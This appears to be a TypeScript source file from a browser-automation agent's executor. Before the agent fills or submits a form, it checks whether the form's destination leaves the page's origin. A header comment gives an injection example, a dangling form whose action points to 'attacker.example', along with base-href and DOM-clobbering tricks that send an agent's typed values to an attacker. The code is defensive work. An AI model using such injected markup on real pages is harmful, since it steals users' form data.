// Where a form sends the values Pateat writes into it. Injected markup can decide that: a
// dangling `<form action="https://attacker.example/">` makes the parser drop the page's own
// `<form>` start tag and take its inputs, and a `<base href>` moves every relative action.
// So before a fill writes into a form, and before a click submits one, the executor reads
// the destination as the browser's form submission would and refuses one off the page's
// origin. A form's controls and a document's named elements shadow their own properties
// (`<input name="getAttribute">`, `<img name="URL">`), so neither is read through its own
// properties: the form's attribute through `Element.prototype`, the document through the
// control, and the document's URL through `Document.prototype`.

/** Why a form submission may not carry the executor's values. */
export type FormRefusal = "form-off-origin";

/** Whether `element` submits its form when clicked: a submit button or an image input. */
export function submitsForm(
  element: Element,
): element is (HTMLButtonElement | HTMLInputElement) & { form: HTMLFormElement } {
  return (
    (element instanceof HTMLButtonElement || element instanceof HTMLInputElement) &&
    (element.type === "submit" || element.type === "image") &&
    element.form !== null
  );
}

/**
 * The element a click on `element` activates: the nearest one from it up that a click
 * acts on (a link, a button, an input or a label), with a label standing for its labeled
 * control. A `role="button"` inside a `<button>`, or a label of a submit button, submits
 * that button's form; `element` itself when nothing around it acts on a click.
 */
export function activatedBy(element: Element): Element {
  const activated = element.closest("a[href], area[href], button, input, label") ?? element;
  return activated instanceof HTMLLabelElement ? (activated.control ?? activated) : activated;
}

/** The URL of `control`'s document, read past any element the document names `URL`. */
function documentUrl(control: Element): string {
  return Reflect.get(Document.prototype, "URL", control.ownerDocument) as string;
}

/**
 * The URL a submission of `form` goes to, as the browser resolves it: the submitter's
 * `formaction` when it has one, else the form's `action`, against the document's base URL;
 * an empty or missing value is the document's URL. The attributes are read rather than the
 * `action` and `formAction` properties: an input named `action` replaces `form.action`, and
 * `formAction` reads the document's URL when the attribute is missing.
 */
function destination(
  control: HTMLButtonElement | HTMLInputElement,
  form: HTMLFormElement,
  submitter: boolean,
): URL | undefined {
  // A button or an input names no properties of its own, unlike its form.
  const value =
    submitter && control.hasAttribute("formaction")
      ? control.getAttribute("formaction")
      : Element.prototype.getAttribute.call(form, "action");
  return URL.parse(value ? value : documentUrl(control), control.baseURI) ?? undefined;
}

/**
 * Why the values in `control`'s form may not be sent: the submission, through `control`'s
 * own `formaction` when a `click` on it sends the form, does not stay on the document's
 * origin (`form-off-origin`): another host of the same site and an unparsable value both
 * count. A `javascript:` destination is allowed: submitting to it runs the URL as script
 * and sends the form's values nowhere, as legacy forms with `action="javascript:void(0)"`
 * rely on, whose own handlers then post the values. A `fill` sends nothing through the
 * control, so only the form's `action` counts there. A control outside any form has no
 * submission to check.
 */
export function formRefusal(
  control: HTMLButtonElement | HTMLInputElement,
  action: "fill" | "click",
): FormRefusal | undefined {
  const { form } = control;
  if (!form) return undefined;
  // An opaque origin reads "null" on both sides, which is no match.
  const { origin } = new URL(documentUrl(control));
  if (origin === "null") return "form-off-origin";
  const target = destination(control, form, action === "click");
  if (!target) return "form-off-origin";
  // The parsed scheme: case, surrounding spaces and tabs inside do not matter. A `data:`
  // destination is a document the markup wrote, not the page, and `vbscript:` never runs.
  if (target.protocol === "data:" || target.protocol === "vbscript:") return "form-off-origin";
  if (target.protocol === "javascript:") return undefined;
  return target.origin === origin ? undefined : "form-off-origin";
}
